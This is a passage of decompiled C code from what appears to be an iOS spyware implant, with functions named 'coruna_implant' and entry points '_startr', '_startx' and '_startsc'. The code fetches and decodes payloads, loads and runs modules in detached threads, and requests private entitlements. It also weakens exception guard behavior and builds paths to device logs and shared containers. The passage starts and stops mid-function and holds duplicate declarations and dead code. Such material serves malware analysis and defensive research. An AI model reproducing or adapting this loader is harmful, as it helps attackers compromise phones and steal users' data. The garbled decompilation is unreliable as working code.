                  (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
            (**(void (**)(arg + 0x5f0))(arg,lpr2,0,0x730c4e4b);
          }
          (**(void (**)(thread_attr + 8))();
          if (((int)lpr2 == 0) && (*(char *)(arg + 0x5c6) == '\0')) {
            coruna_implant65fc_via_ctx_free_9e78(block_ctx,arg);
            if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
              (**(void (**)(arg + 0x5f0))(arg,lpr2,0,0x730c404e);
            }
            if (*(char *)(arg + 0x5c2) == '\0') {
              *(uint64_t *)(arg + 0x28) = version;
              *(uint64_t *)(arg + 0xb0) = port;
              *(uint64_t *)(arg + 0x120) = kind;
              *(uint64_t *)(arg + 0x128) = tag;
            }
            return lpr2;
          }
        }
      }
      else if ((*(char *)(arg + 0x5eb) != '\0') &&
              (ptr = *(void (**)(arg + 0x5f0), ptr != (void (*)0x0)) {
        err = 0xe68;
        (*ptr)(arg,lpr2,0,err + 0x730c404e);
      }
      (**(void (**)(block_ctx + 0x60))(block_ctx,serial_buf);
    }
    else if ((*(char *)(arg + 0x5eb) != '\0') &&
            (ptr = *(void (**)(arg + 0x5f0), ptr != (void (*)0x0)) {
      err = 0xe5c;
      (*ptr)(arg,lpr2,0,err + 0x730c404e);
    }
  }
  else if ((*(char *)(arg + 0x5eb) != '\0') &&
          (ptr = *(void (**)(arg + 0x5f0), ptr != (void (*)0x0)) {
    err = 0xe52;
    (*ptr)(arg,lpr2,0,err + 0x730c404e);
  }
  coruna_implant65fc_via_ctx_free_9e78(block_ctx,arg);
  if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
    (**(void (**)(arg + 0x5f0))(arg,lpr2,0,0x730c404e);
  }
  if (*(char *)(arg + 0x5c2) == '\0') {
    *(uint64_t *)(arg + 0x28) = version;
    *(uint64_t *)(arg + 0xb0) = port;
    *(uint64_t *)(arg + 0x120) = kind;
    *(uint64_t *)(arg + 0x128) = tag;
  }
  return lpr2;
}





uint64_t _startr(short *arg)
{
  bool err;
  short *lps2;
  uint64_t u;
  uint scratch;
  int *bootargs;
  
  u = 0xad001;
  if ((((arg != (short *)0x0) && (*arg == 1)) && (arg[1] != 0)) &&
     (((lps2 = *(short **)(arg + 0x1c), lps2 != (short *)0x0 && (*lps2 == 1)) &&
      (lps2[1] != 0)))) {
    bootargs = (int *)0x0;
    scratch = 0;
    u = (**(void (**)(lps2 + 0xc))(lps2,0x70005,&bootargs,&scratch);
    if ((int)u == 0) {
      if (bootargs == (int *)0x0) {
        return 0xad001;
      }
      if (scratch == 0) {
        return 0xad001;
      }
      if (scratch < 0x18) {
        return 0xad014;
      }
      if (*bootargs != -0x21522ff1) {
        return 0xad014;
      }
      err = (char)bootargs[1] != '\0';
    }
    else {
      if ((int)u != 0x7003) {
        return u;
      }
      err = false;
    }
    u = coruna_run_startx(arg,err,1);
  }
  return u;
}
unsigned long coruna_run_startx(short *arg,uint val,int n)

{
  uint32_t u;
  uint size;
  char *ptr;
  unsigned long version;
  uint port;
  short *lps6;
  unsigned long kind;
  short *lps8;
  unsigned long type_id;
  short *lps10;
  long stack_guard;
  short *sa_saved;
  void *sa_new;
  unsigned long path_buf;
  char *tmp_buf;
  char region [8];
  long plist;
  long url_buf;
  unsigned long json_buf;
  uint32_t frame;
  uint64_t scratch;
  uint32_t work;
  unsigned long thread_attr;
  unsigned long host_info;
  uint64_t scratch;
  char *action;
  uint64_t cache;
  unsigned long cache_20;
  
  type_id = 0xad001;
  if ((((((arg == (short *)0x0) || (*arg != 1)) || (arg[1] == 0)) ||
       (((lps8 = *(short **)(arg + 0x14), lps8 == (short *)0x0 || (*lps8 != 3)) ||
        ((lps8[1] == 0 ||
         ((lps6 = *(short **)(arg + 0x18), lps6 == (short *)0x0 || (*lps6 != 2)))))))) ||
      ((ushort)lps6[1] < 2)) ||
     (((sa_saved = *(short **)(arg + 0x1c), sa_saved == (short *)0x0 || (*sa_saved != 1)) ||
      (sa_saved[1] == 0)))) {
    return 0xad001;
  }
  region[0] = '\0';
  region[1] = '\0';
  region[2] = '\0';
  region[3] = '\0';
  region[4] = '\0';
  region[5] = '\0';
  region[6] = '\0';
  region[7] = '\0';
  plist = 0;
  url_buf = 0;
  stack_guard = 0;
  sa_new = (void *)0x0;
  path_buf = 0;
  tmp_buf = region;
  if (((val & 1) != 0) || (n != 0)) {
    if (*(double *)k_implant_dyldversionnumber_slot < k_implant_rodata_word_1e840) {
      region[0] = (char)val;
    }
    else if (*(void (**)(void))(lps6 + 0x20) != (void (*)0x0) {
      scratch = k_implant_rodata_word_0001e858;
      host_info = k_implant_rodata_word_1e850;
      kind = (**(void (**)(void))(lps6 + 0x20))(lps6,&stack_guard,&host_info,1,0);
      if (stack_guard != 0) {
      (**(void (**)(void))(lps6 + 0x18))();
      (**(void (**)(void))(lps6 + 0x10))(lps6,stack_guard);
      }
      return kind;
    }
    else {
      kind = 0xad001;
      if (stack_guard != 0) {
      (**(void (**)(void))(lps6 + 0x18))();
      (**(void (**)(void))(lps6 + 0x10))(lps6,stack_guard);
      }
      return kind;
    }
  }
  if (val == 0) {
    if (n != 0) {
nomem:
      if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
        coruna_call_parse_https_url(tmp_buf,0xcc10a,0x730c4207);
      }
      cache_20 = 0;
      scratch = (unsigned long)scratch << 0x20;
      kind = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70001,&cache_20,&scratch);
      if ((int)kind == 0) {
        cache = 0;
        json_buf = json_buf & 0xffffffff00000000;
        port = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70004,&cache,&json_buf);
        size = 0;
        if (port != 0x7003) {
          size = port;
        }
        kind = (unsigned long)size;
        if (size == 0) {
          kind = coruna_cfhttpmessagesetheaderfieldvalue(cache_20,cache,0,0,&sa_new,&path_buf);
          if ((int)kind == 0) {
            host_info = 0;
            thread_attr = thread_attr & 0xffffffff00000000;
            kind = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70002,&host_info,&thread_attr);
            while ((int)kind == 0x7003 || (int)kind == 0) {
              if ((int)kind == 0x7003) {
                kind = coruna_compression_decode_buffer(&sa_new,&path_buf);
              }
              else {
                coruna_implant65fc_via_u64_pack(host_info,sa_new,path_buf & 0xffffffff);
                kind = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70002,&host_info,&thread_attr);
              }
            }
            if ((int)kind == 0) {
              kind = (**(void (**)(sa_saved + 8))(sa_saved,sa_new,path_buf & 0xffffffff);
              if ((int)kind != 0) {
                if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
                  coruna_call_parse_https_url(tmp_buf,kind,0x730c4277);
                }
                _bzero(sa_new,path_buf & 0xffffffff);
                _free(sa_new);
                sa_new = (void *)0x0;
                path_buf = path_buf & 0xffffffff00000000;
              }
              if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
                coruna_call_parse_https_url(tmp_buf,0xcc10b,0x730c4263);
              }
            }
            else {
              _bzero(sa_new,path_buf & 0xffffffff);
              _free(sa_new);
              sa_new = (void *)0x0;
              path_buf = path_buf & 0xffffffff00000000;
              if (tmp_buf != (char *)0x0) {
                if (*tmp_buf != '\0') {
                  coruna_call_parse_https_url(tmp_buf,kind,0x730c4260);
                }
                if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
                  coruna_call_parse_https_url(tmp_buf,0xcc10b,0x730c4263);
                }
              }
            }
          }
          else if (tmp_buf != (char *)0x0) {
            if (*tmp_buf != '\0') {
              coruna_call_parse_https_url(tmp_buf,kind,0x730c4260);
            }
            if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
              coruna_call_parse_https_url(tmp_buf,0xcc10b,0x730c4263);
            }
          }
        }
        else if (tmp_buf != (char *)0x0) {
          if (*tmp_buf != '\0') {
            coruna_call_parse_https_url(tmp_buf,kind,0x730c4260);
          }
          if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
            coruna_call_parse_https_url(tmp_buf,0xcc10b,0x730c4263);
          }
        }
      }
      if ((int)kind != 0) {
        if (((region[0] != '\0') && (url_buf != 0)) && (plist != 0)) {
          coruna_parse_https_url(url_buf,plist,kind,0,0x730c452e);
        }
        if (stack_guard != 0) {
        (**(void (**)(lps6 + 0x18))();
        (**(void (**)(lps6 + 0x10))(lps6,stack_guard);
        }
        return kind;
      }
    }
  }
  else {
    lps10 = *(short **)(arg + 0x1c);
    kind = 0xad001;
    if (stack_guard != 0) {
    (**(void (**)(lps6 + 0x18))();
    (**(void (**)(lps6 + 0x10))(lps6,stack_guard);
    }
    return kind;
  }
  if (((region[0] != '\0') && (url_buf != 0)) && (plist != 0)) {
    coruna_parse_https_url(url_buf,plist,0xcc10c,0,0x730c4522);
  }
  thread_attr = 0;
  work = 0;
  scratch = 0;
  frame = 0;
  port = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70003,&thread_attr,&work);
  size = 0;
  if (port != 0x7003) {
    size = port;
  }
  kind = (unsigned long)size;
  if (((size == 0) &&
      (kind = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70004,&scratch,&frame),
      (int)kind == 0x7003)) || ((int)kind == 0)) {
    json_buf = 0;
    kind = coruna_strdup_2(&json_buf,sa_saved,lps6,lps8,thread_attr,scratch);
    version = json_buf;
    ptr = tmp_buf;
    if ((int)kind == 0) {
      if (json_buf == 0) {
        if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
          coruna_call_parse_https_url(tmp_buf,type_id,0x730c4ca9);
        }
      }
      else {
        cache = 0;
        cache_20 = 0;
        type_id = coruna_implant65fc_residual_86(json_buf,0x10000,"_startx",&cache_20,&cache);
        if ((int)type_id == 0) {
          host_info = version;
          scratch = cache;
          action = ptr;
          type_id = coruna_pthread_attr_setdetachstate(coruna_implant65fc_via_call_parse_https_url,&host_info);
          if ((((int)type_id != 0) && (ptr != (char *)0x0)) && (*ptr != '\0')) {
            coruna_call_parse_https_url(ptr,type_id,0x730c4cba);
          }
          (**(void (**)(version + 0x60))(version,cache_20);
        }
        else if ((ptr != (char *)0x0) && (*ptr != '\0')) {
          coruna_call_parse_https_url(ptr,type_id,0x730c4cb3);
        }
      }
      coruna_implant65fc_via_ctx_free_9e78_2(json_buf);
    }
    else {
      type_id = kind;
      if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
        coruna_call_parse_https_url(tmp_buf,kind,0x730c4316);
      }
    }
  }
  else {
    type_id = kind;
    if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
      coruna_call_parse_https_url(tmp_buf,kind,0x730c430d);
      type_id = kind;
    }
  }
  if (((((int)type_id != 0) && (region[0] != '\0')) && (url_buf != 0)) && (plist != 0)) {
    coruna_parse_https_url(url_buf,plist,type_id,0,0x730c4510);
  }
  kind = type_id;
  if (sa_new != (void *)0x0) {
    if ((int)path_buf != 0) {
      _bzero(sa_new,path_buf & 0xffffffff);
      _free(sa_new);
      sa_new = (void *)0x0;
      path_buf = path_buf & 0xffffffff00000000;
    }
  }
retry:
  if (stack_guard != 0) {
    (**(void (**)(lps6 + 0x18))();
    (**(void (**)(lps6 + 0x10))(lps6,stack_guard);
  }
  return kind;
}





void _startm(uint64_t val)
{
  coruna_run_startx(val,0,0);
  return;
}





uint64_t coruna_memset_s_71f8(long *handle)
{
  uint64_t u;
  uint64_t scratch;
  
  if ((k_implant_rodata_word_24c3b != '\0') && (k_implant_rodata_word_24c40 != (void (*)0x0)) {
    (*k_implant_rodata_word_24c40)(&k_implant_rodata_word_24650,0xcc106,0,0x730c4cf0);
  }
  if ((((handle == (long *)0x0) || (*handle == 0)) || (handle[2] == 0)) || ((int)handle[3] == 0)
     ) {
    if (k_implant_rodata_word_24c30 != (uint32_t *)0x0) {
    *k_implant_rodata_word_24c30 = 5;
    }
    return 0;
    (*k_implant_rodata_word_24c40)(&k_implant_rodata_word_24650,0xad001,0,0x730c4f27);
  }
  else {
    scratch = 0;
    u = coruna_bzero_3(&scratch);
    if ((int)u == 0) {
      u = coruna_run_startsc(&k_implant_rodata_word_24650,scratch,0);
      if ((((int)u != 0) && (k_implant_rodata_word_24c3b != '\0')) && (k_implant_rodata_word_24c40 != (void (*)0x0)) {
        (*k_implant_rodata_word_24c40)(&k_implant_rodata_word_24650,u,0,0x730c4ccc);
      }
      coruna_implant65fc_via_ctx_free_9e78_3(scratch);
      scratch = 0;
    }
    else if ((k_implant_rodata_word_24c3b != '\0') && (k_implant_rodata_word_24c40 != (void (*)0x0)) {
      (*k_implant_rodata_word_24c40)(&k_implant_rodata_word_24650,u,0,0x730c4cc6);
    }
    if ((char)handle[1] != '\0') {
      (**(void (**)(*handle + 0x10))();
    }
    _memset_s(handle[2],(int)handle[3],0,(int)handle[3]);
    _free((void *)handle[2]);
    if (handle[4] != 0) {
      coruna_memset_s();
    }
    if (handle[5] != 0) {
      coruna_memset_s();
    }
    if (handle[6] != 0) {
      coruna_memset_s();
    }
    _memset_s(handle,0x38,0,0x38);
    _free(handle);
  }
  if ((k_implant_rodata_word_24c3b != '\0') && (k_implant_rodata_word_24c40 != (void (*)0x0)) {
    (*k_implant_rodata_word_24c40)(&k_implant_rodata_word_24650,0xcc107,0,0x730c4f22);
  }
code_r0x000073e8:
  if (k_implant_rodata_word_24c30 != (uint32_t *)0x0) {
    *k_implant_rodata_word_24c30 = 5;
  }
  return 0;
}





unsigned long coruna_run_startsc(long arg,long val,long n)

{
  uint32_t u;
  uint32_t *ptr;
  uint64_t type_id_8;
  uint version;
  char err;
  bool err;
  uint8_t *buf;
  uint8_t *str;
  bool status;
  uint type_id_9;
  int status;
  void (*buf)(void);
  long handle;
  long addr;
  unsigned long type_id_10;
  unsigned long type_id_11;
  unsigned long type_id_12;
  uint64_t cache_21;
  uint64_t bootargs;
  uint64_t cache_22;
  uint64_t thread_attr;
  uint64_t cache_23;
  char *cache_24;
  long cache_25;
  void (*cache_26)(void);
  uint cache_27;
  char *cache_28;
  char scratch [8];
  char bootargs [8];
  uint64_t host_info;
  char cache_29;
  uint64_t serial_buf;
  char cache_30;
  uint64_t action;
  char cache_31;
  char thread_attr [8];
  char host_info [8];
  char cache_32 [8];
  char serial_buf [7];
  char cache_33;
  char action [7];
  uint8_t cache_34[936];
  uint8_t cache_35;
  mach_port_name_t cache_36;
  uint64_t host_info;
  
  cache_25 = n;
  if (arg == 0) {
    if (val == 0) {
      return 0xad001;
    }
load_ok_15:
    bootargs = 0;
    thread_attr = 0;
    cache_21 = 8;
    cache_22 = 10;
    cache_24 = 
    "<dict><key>com.apple.private.webbookmarks.settings</key><true/><key>com.apple.private.security.storage.DiagnosticReports.read-write</key><true/></dict>"
    ;
    cache_23 = 0x40000004;
    type_id_10 = (**(void (**)(val + 0x80))(val,&cache_25,&cache_21,3,0);
    str = k_implant_task_set_exc_guard_behavior_slot;
    buf = k_implant_mach_task_self_slot;
    if ((int)type_id_10 == 0) {
      if (k_implant_task_get_exc_guard_behavior_slot == (uint8_t *)0x0 ||
          k_implant_task_set_exc_guard_behavior_slot == (uint8_t *)0x0) {
        status = false;
        type_id_11 = 0;
load_ok_16:
        handle = cache_25;
        cache_28 = (char *)0x0;
        type_id_10 = coruna_implant65fc_residual_85(val,&cache_28);
        if (((int)type_id_10 == 0) && ((char)cache_28 == '\0')) {
          host_info = (char *)0x0;
          cache_26 = (void (*)0x0;
          type_id_9 = coruna_implant65fc_residual_86(val,0xa0000,"_startsc",&host_info,&cache_26);
          if (type_id_9 == 0) {
            type_id_10 = (*cache_26)(val,handle,&cache_28);
            (**(void (**)(val + 0x60))(val,host_info);
          }
          else {
            version = 0;
            if (type_id_9 != 0x7003) {
              version = type_id_9;
            }
            type_id_10 = (unsigned long)version;
          }
        }
        host_info = (char *)((unsigned long)host_info & 0xffffffff00000000);
        (**(void (**)(val + 0xe0))(val,0xa0000,&host_info,4);
        if ((int)type_id_10 == 0) {
          do {
            if (k_implant_rodata_word_24c98 != '\0') {
              type_id_10 = 0;
              ClearExclusiveLocal();
              break;
            }
            err = '\x01';
            err = (bool)coruna_ldrex_pass(0x24c98,0x10);
            if (err) {
              k_implant_rodata_word_24c98 = '\x01';
              err = coruna_ldrexp_clear();
            }
          } while (err != '\0');
          if (((arg != 0) && (*(char *)(arg + 0x5eb) != '\0')) &&
             (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
            (**(void (**)(arg + 0x5f0))(arg,0xcc108,0,0x730c4a49);
          }
          cache_28 = (char *)0x0;
          cache_26 = (void (*)((unsigned long)cache_26 & 0xffffffff00000000);
          type_id_10 = (**(void (**)(val + 0x68))(val,0x80000,&cache_28,&cache_26);
          if ((int)type_id_10 == 0) {
            host_info = (char *)0x0;
            type_id_10 = coruna_implant65fc_residual_87(&host_info,val);
            if ((int)type_id_10 == 0) {
              if (*(int *)((long)host_info + 0x14) == 0) {
                type_id_10 = 0;
              }
              else {
                type_id_12 = 0;
                type_id_10 = 0;
                handle = (long)host_info;
                do {
                  if (*(int *)(handle + 0x10) != 0) {
                    type_id_9 = 0;
                    do {
                      cache_36 = 0;
                      addr = handle + type_id_12 * 0xc;
                      status = *(int *)(addr + 0x18);
                      ptr = (uint32_t *)(handle + (unsigned long)*(uint *)(addr + 0x1c));
                      type_id_10 = 0xad014;
                      if (status - 2U < 2) {
                        if (*(char *)((long)ptr +
                                     (unsigned long)(*(int *)(handle + type_id_12 * 0xc + 0x20) - 1)) == '\0') {
                          type_id_8 = 1;
                          if (status != 3) {
                            type_id_8 = 2;
                          }
                          type_id_10 = (**(void (**)(val + 0xf8))
                                             (val,ptr,type_id_8,cache_28,
                                              (unsigned long)cache_26 & 0xffffffff,"_startr",0,0,&cache_36)
                          ;
                          if ((int)type_id_10 == 0) {
                            if (*(int *)((long)host_info + 0xc) == 0) {
load_ok_19:
                              type_id_10 = 0;
                            }
                            else {
                              cache_27 = 0xad000;
                              type_id_10 = (**(void (**)(val + 0x100))
                                                 (val,cache_36,*(int *)((long)host_info + 0xc),
                                                  &cache_27);
                              if ((int)type_id_10 == 0x1e02a) {
                                type_id_10 = 0;
                              }
                              if ((int)type_id_10 == 0) {
                                type_id_10 = (unsigned long)cache_27;
                              }
                              else if (((arg != 0) && (*(char *)(arg + 0x5eb) != '\0')) &&
                                      (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
                                (**(void (**)(arg + 0x5f0))(arg,type_id_10,0,0x730c4ac6);
                              }
                            }
                            _mach_port_mod_refs(*(ipc_space_t *)k_implant_mach_task_self_slot,
                                                cache_36,1,-1);
                            goto load_ok_17;
                          }
                        }
                      }
                      else if (status == 1) {
                        if (*(int *)(handle + type_id_12 * 0xc + 0x20) == 4) {
                          type_id_10 = (**(void (**)(val + 0xf0))
                                             (val,*ptr,cache_28,
                                              (unsigned long)cache_26 & 0xffffffff,"_startr",0,0,&cache_36)
                          ;
                        }
                        else {
                          type_id_10 = 0xad014;
                        }
                      }
                      if (((arg != 0) && (*(char *)(arg + 0x5eb) != '\0')) &&
                         (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
                        (**(void (**)(arg + 0x5f0))(arg,type_id_10,0,0x730c4d37);
                      }
                      type_id_9 = type_id_9 + 1;
                      handle = (long)host_info;
                    } while (type_id_9 < *(uint *)((long)host_info + 0x10));
                  }
                  type_id_12 = type_id_12 + 1;
                } while (type_id_12 < *(uint *)(handle + 0x14));
              }
            }
          }
        }
load_ok_17:
        host_info = (char *)0x0;
        status = coruna_implant65fc_residual_85(val,&host_info);
        if ((status == 0) && ((char)host_info == '\0')) {
          _bzero(&cache_31,0x3d0);
          scratch[0] = s__private_var_mobile_Library_Logs_0001ea09[8];
          scratch[1] = s__private_var_mobile_Library_Logs_0001ea09[9];
          scratch[2] = s__private_var_mobile_Library_Logs_0001ea09[10];
          scratch[3] = s__private_var_mobile_Library_Logs_0001ea09[0xb];
          scratch[4] = s__private_var_mobile_Library_Logs_0001ea09[0xc];
          scratch[5] = s__private_var_mobile_Library_Logs_0001ea09[0xd];
          scratch[6] = s__private_var_mobile_Library_Logs_0001ea09[0xe];
          scratch[7] = s__private_var_mobile_Library_Logs_0001ea09[0xf];
          cache_28 = (char *)0;
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x18];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x19];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x1a];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x1b];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x1c];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x1d];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x1e];
          bootargs[0] = s__private_var_mobile_Library_Logs_0001ea09[0x10];
          bootargs[1] = s__private_var_mobile_Library_Logs_0001ea09[0x11];
          bootargs[2] = s__private_var_mobile_Library_Logs_0001ea09[0x12];
          bootargs[3] = s__private_var_mobile_Library_Logs_0001ea09[0x13];
          bootargs[4] = s__private_var_mobile_Library_Logs_0001ea09[0x14];
          bootargs[5] = s__private_var_mobile_Library_Logs_0001ea09[0x15];
          bootargs[6] = s__private_var_mobile_Library_Logs_0001ea09[0x16];
          bootargs[7] = s__private_var_mobile_Library_Logs_0001ea09[0x17];
          cache_30 = (char)0;
          action = SUB87(0,1);
          cache_29 = s__private_var_mobile_Library_Logs_0001ea09[0x1f];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x20];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x21];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x22];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x23];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x24];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x25];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x26];
          cache_35 = 0;
          coruna_find_webcontent(&cache_28,host_info);
          _bzero(cache_34,0x3a8);
          action = (uint64_t)0;
          cache_31 = SUB81(0,7);
          serial_buf = (uint64_t)0;
          cache_30 = SUB81(0,7);
          host_info[0] = s__var_containers_Shared_SystemGro_0001ea38[0x38];
          host_info[1] = s__var_containers_Shared_SystemGro_0001ea38[0x39];
          host_info[2] = s__var_containers_Shared_SystemGro_0001ea38[0x3a];
          host_info[3] = s__var_containers_Shared_SystemGro_0001ea38[0x3b];
          host_info[4] = s__var_containers_Shared_SystemGro_0001ea38[0x3c];
          host_info[5] = s__var_containers_Shared_SystemGro_0001ea38[0x3d];
          host_info[6] = s__var_containers_Shared_SystemGro_0001ea38[0x3e];
          host_info[7] = s__var_containers_Shared_SystemGro_0001ea38[0x3f];
          thread_attr[0] = s__var_containers_Shared_SystemGro_0001ea38[0x30];
          thread_attr[1] = s__var_containers_Shared_SystemGro_0001ea38[0x31];
          thread_attr[2] = s__var_containers_Shared_SystemGro_0001ea38[0x32];
          thread_attr[3] = s__var_containers_Shared_SystemGro_0001ea38[0x33];
          thread_attr[4] = s__var_containers_Shared_SystemGro_0001ea38[0x34];
          thread_attr[5] = s__var_containers_Shared_SystemGro_0001ea38[0x35];
          thread_attr[6] = s__var_containers_Shared_SystemGro_0001ea38[0x36];
          thread_attr[7] = s__var_containers_Shared_SystemGro_0001ea38[0x37];
          serial_buf[0] = s__var_containers_Shared_SystemGro_0001ea38[0x48];
          serial_buf[1] = s__var_containers_Shared_SystemGro_0001ea38[0x49];
          serial_buf[2] = s__var_containers_Shared_SystemGro_0001ea38[0x4a];
          serial_buf[3] = s__var_containers_Shared_SystemGro_0001ea38[0x4b];
          serial_buf[4] = s__var_containers_Shared_SystemGro_0001ea38[0x4c];
          serial_buf[5] = s__var_containers_Shared_SystemGro_0001ea38[0x4d];
          serial_buf[6] = s__var_containers_Shared_SystemGro_0001ea38[0x4e];
          cache_32[0] = s__var_containers_Shared_SystemGro_0001ea38[0x40];
          cache_32[1] = s__var_containers_Shared_SystemGro_0001ea38[0x41];
          cache_32[2] = s__var_containers_Shared_SystemGro_0001ea38[0x42];
          cache_32[3] = s__var_containers_Shared_SystemGro_0001ea38[0x43];
          cache_32[4] = s__var_containers_Shared_SystemGro_0001ea38[0x44];
          cache_32[5] = s__var_containers_Shared_SystemGro_0001ea38[0x45];
          cache_32[6] = s__var_containers_Shared_SystemGro_0001ea38[0x46];
          cache_32[7] = s__var_containers_Shared_SystemGro_0001ea38[0x47];
          cache_33 = s__var_containers_Shared_SystemGro_0001ea38[0x4f];
          action[0] = s__var_containers_Shared_SystemGro_0001ea38[0x50];
          action[1] = s__var_containers_Shared_SystemGro_0001ea38[0x51];
          action[2] = s__var_containers_Shared_SystemGro_0001ea38[0x52];
          action[3] = s__var_containers_Shared_SystemGro_0001ea38[0x53];
          action[4] = s__var_containers_Shared_SystemGro_0001ea38[0x54];
          action[5] = s__var_containers_Shared_SystemGro_0001ea38[0x55];
          action[6] = s__var_containers_Shared_SystemGro_0001ea38[0x56];
          scratch[0] = s__var_containers_Shared_SystemGro_0001ea38[8];
          scratch[1] = s__var_containers_Shared_SystemGro_0001ea38[9];
          scratch[2] = s__var_containers_Shared_SystemGro_0001ea38[10];
          scratch[3] = s__var_containers_Shared_SystemGro_0001ea38[0xb];
          scratch[4] = s__var_containers_Shared_SystemGro_0001ea38[0xc];
          scratch[5] = s__var_containers_Shared_SystemGro_0001ea38[0xd];
          scratch[6] = s__var_containers_Shared_SystemGro_0001ea38[0xe];
          scratch[7] = s__var_containers_Shared_SystemGro_0001ea38[0xf];
          cache_28 = (char *)0;
          host_info = (uint64_t)0;
          cache_29 = SUB81(0,7);
          bootargs[0] = s__var_containers_Shared_SystemGro_0001ea38[0x10];
          bootargs[1] = s__var_containers_Shared_SystemGro_0001ea38[0x11];
          bootargs[2] = s__var_containers_Shared_SystemGro_0001ea38[0x12];
          bootargs[3] = s__var_containers_Shared_SystemGro_0001ea38[0x13];
          bootargs[4] = s__var_containers_Shared_SystemGro_0001ea38[0x14];
          bootargs[5] = s__var_containers_Shared_SystemGro_0001ea38[0x15];
          bootargs[6] = s__var_containers_Shared_SystemGro_0001ea38[0x16];
          bootargs[7] = s__var_containers_Shared_SystemGro_0001ea38[0x17];
          cache_35 = 0;
          coruna_find_webcontent(&cache_28,host_info);
        }
        cache_28 = (char *)0x0;
        cache_26 = (void (*)((unsigned long)cache_26 & 0xffffffff00000000);
        host_info = (char *)0x0;
        cache_36 = 0;
        status = (**(void (**)(val + 0x68))(val,0x70001,&cache_28,&cache_26);
        if ((((status == 0) && ((int)cache_26 != 0)) && (cache_28 != (char *)0x0)) &&
           (*cache_28 != '\0')) {
          coruna_pthread_attr_setdetachstate(coruna_call_objc_opt_respondstoselector);
        }
        status = (**(void (**)(val + 0x68))(val,0x70003,&host_info,&cache_36);
        if (((status == 0) && (cache_36 != 0)) && ((host_info != (char *)0x0 && (*host_info != '\0')))
           ) {
          coruna_pthread_attr_setdetachstate(coruna_call_objc_opt_respondstoselector);
        }
        if ((status) && (str != (uint8_t *)0x0)) {
          _task_set_exc_guard_behavior(*(uint32_t *)k_implant_mach_task_self_slot,type_id_11);
        }
      }
      else {
        cache_28 = (char *)((unsigned long)cache_28 & 0xffffffff00000000);
        type_id_9 = _task_get_exc_guard_behavior
                           (*(uint32_t *)k_implant_mach_task_self_slot,&cache_28);
        if (type_id_9 == 0) {
          type_id_10 = (unsigned long)cache_28 & 0x88;
          if (((unsigned long)cache_28 & 0x88) == 0) {
            type_id_11 = 0;
            status = type_id_10 != 0;
            goto load_ok_16;
          }
          type_id_9 = _task_set_exc_guard_behavior
                             (*(uint32_t *)buf,(uint)cache_28 & 0xffffff77);
          if (type_id_9 == 0) {
            type_id_11 = (unsigned long)cache_28 & 0xffffffff;
            status = type_id_10 != 0;
            goto load_ok_16;
          }
          type_id_10 = (unsigned long)(type_id_9 | 0x80000000);
          if (((arg != 0) && (*(char *)(arg + 0x5eb) != '\0')) &&
             (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
            (**(void (**)(arg + 0x5f0))(arg,type_id_10,0,0x730c4db9);
          }
        }
        else {
          type_id_10 = (unsigned long)(type_id_9 | 0x80000000);
          if (((arg != 0) && (*(char *)(arg + 0x5eb) != '\0')) &&
             (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
            (**(void (**)(arg + 0x5f0))(arg,type_id_10,0,0x730c4db9);
          }
        }
      }
      if (n == 0) {
        (**(void (**)(val + 0x88))(val,cache_25);
        (**(void (**)(val + 0x90))(val,cache_25);
        cache_25 = 0;
      }
      if (arg == 0) {
        return type_id_10;
      }
      if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
        (**(void (**)(arg + 0x5f0))(arg,0xcc109,0,0x730c4da7);
      }
      return type_id_10;
    }
    if (arg == 0) {
      return type_id_10;
    }
    u = 0x730c4dae;
    if ((*(char *)(arg + 0x5eb) != '\0') &&
        (buf = *(void (**)(arg + 0x5f0), buf != (void (*)0x0)) {
      (*buf)(arg,type_id_10,0,u);
    }
  }
  else {
    if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
      (**(void (**)(arg + 0x5f0))(arg,0xcc108,0,0x730c4d06);
    }
    if (val != 0) goto load_ok_15;
    type_id_10 = 0xad001;
    u = 0x730c4da4;
    if ((*(char *)(arg + 0x5eb) != '\0') &&
        (buf = *(void (**)(arg + 0x5f0), buf != (void (*)0x0)) {
      (*buf)(arg,type_id_10,0,u);
    }
  }
  if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
